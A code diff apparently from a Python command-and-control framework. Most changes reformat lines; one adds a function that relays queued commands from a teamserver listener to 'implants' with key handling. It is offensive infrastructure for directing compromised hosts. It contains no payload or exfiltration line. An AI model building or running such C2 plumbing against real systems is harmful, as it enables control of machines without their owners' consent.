@@ -6,7 +6,8 @@ from lib.crypto import asymmetric
 
 def _get_transport_index(listener, transport_id):
     try:
-        transport_index = next(index for (index, transport) in enumerate(listener.transports) if transport.transport_id == transport_id)
+        transport_index = next(
+            index for (index, transport) in enumerate(listener.transports) if transport.transport_id == transport_id)
         return transport_index
     except StopIteration:
         listener.logging.log(f"{transport_id} not found!",
@@ -26,7 +27,8 @@ def send_manifest(frame, listener):
     """
     listener.ts_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][0]['tpk']))
     # TODO: HIGH_PRI: Make a listener.manifest
-    data = {'component_id': listener.component_id, "cmd": "lpm", "args": [listener.manifest, {"lpk": listener.initial_public_key._public_key}],
+    data = {'component_id': listener.component_id, "cmd": "lpm",
+            "args": [listener.manifest, {"lpk": listener.initial_public_key._public_key}],
             "txid": frame['txid']}
     instruction_frame = instructions.create_instruction_frame(data)
     # TODO: value setting
@@ -41,14 +43,16 @@ def send_initialization(listener):
     SETS: LP Keypair, LP State
     :return:
     """
-    data = {'component_id': listener.component_id, "cmd": "lpi", "args":[{"lpk": listener.initial_public_key._public_key}]}
+    data = {'component_id': listener.component_id, "cmd": "lpi",
+            "args": [{"lpk": listener.initial_public_key._public_key}]}
     instruction_frame = instructions.create_instruction_frame(data)
     reply_frame = transmit.cook_sealed_frame(listener, instruction_frame)
     return reply_frame
 
 
 def rekey(frame, listener):
-    data = {'component_id': listener.component_id, "cmd": "rko", "args":[{"lpk": listener.initial_public_key._public_key}]}
+    data = {'component_id': listener.component_id, "cmd": "rko",
+            "args": [{"lpk": listener.initial_public_key._public_key}]}
 
     listener.ts_pubkey = asymmetric.public_key_from_bytes(listener.config.config['crypto']['ts_pk'])
     listener.current_private_key = listener.initial_private_key
@@ -82,7 +86,8 @@ def request_command(listener):
     :return:
     """
     # TODO: Technically we're shipping the lp privkey for each implant over, we should probably scrub it, but it doesn't really matter since it's gonna rotate after this transaction anyways
-    data = {'component_id': listener.component_id, "cmd": "gcmd", "args":[{"lpk": listener.initial_public_key._public_key}, {"implants": listener.implants}]}
+    data = {'component_id': listener.component_id, "cmd": "gcmd",
+            "args": [{"lpk": listener.initial_public_key._public_key}, {"implants": listener.implants}]}
     instruction_frame = instructions.create_instruction_frame(data)
     reply_frame = transmit.cook_transmit_frame(listener, instruction_frame, "teamserver")
     return reply_frame
@@ -110,4 +115,55 @@ def receive_command(frame, listener):
     listener.current_ts_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][1]['tpk']))
     instruction_frame = instructions.create_instruction_frame(data)
     reply_frame = transmit.cook_transmit_frame(listener, instruction_frame, "teamserver")
+    return reply_frame
+
+
+# TODO: Unused
+# def relay_cmds(listener):
+#     for command in listener.cmd_queue:
+#         if command['state'] == "RELAYING":
+#             try:
+#                 implant_index = implants._get_implant_index(listener, command['component_id'])
+#                 transport_index = _get_transport_index(listener, command['transport_id'])
+#                 if str(implant_index) and str(transport_index):
+#                     # TODO: Cook the command, you can resolve the implant's keys with the implant_index
+#                     listener.transports[transport_index].send_data(command)
+#             except Exception as e:
+#                 listener.logging.log(
+#                     f"Critical [{type(e).__name__}] when relaying command to implant {command['component_id']}: {e}",
+#                     level="critical", source=f"lib.core")
+
+
+def retrieve_command_for_implant(frame, listener):
+    """
+    Received a request for commands from the implant, this transaction is probably being awaited by the transport, so
+    don't return anything until you have a command to return
+    """
+    return_commands = []
+    implant_pubkey = frame['args'][0]['ipk']
+    implant_id = frame['component_id']
+    implant_index = implants._get_implant_index(listener, implant_id)
+    listener.implants[implant_index]['ipk'] = implant_pubkey
+    transport_index = _get_transport_index(listener, listener.implants[implant_index]['transport_id'])
+    for command in listener.cmd_queue:
+        if command['state'] == "RELAYING":
+            try:
+                if implant_index == implants._get_implant_index(listener, command['component_id']) and \
+                        transport_index == command['transport_index']:
+                    command['state'] = "RELAYED"
+                    listener.logging.log(f"Relaying cmd: {command} to implant {implant_id}",level="debug",
+                                         source=f"lib.core")
+                    return_commands.append(command)
+            except Exception as e:
+                listener.logging.log(
+                    f"Critical [{type(e).__name__}] when relaying command to implant {command['component_id']}: {e}",
+                    level="critical", source=f"lib.core")
+    # Cook it with the implant's keys and make it a data frame
+    # TODO: Rotate the key
+    data = {'component_id': listener.component_id, "cmd": "gcmd",
+            "args": [return_commands, {'lpk': listener.implants[implant_index]['lpk']}],
+            "txid": frame['txid']}
+    instruction_frame = instructions.create_instruction_frame(data)
+    # TODO: Cook the reply frame
+    reply_frame = transmit.cook_transmit_frame(listener, instruction_frame, implant_id)
     return reply_frame
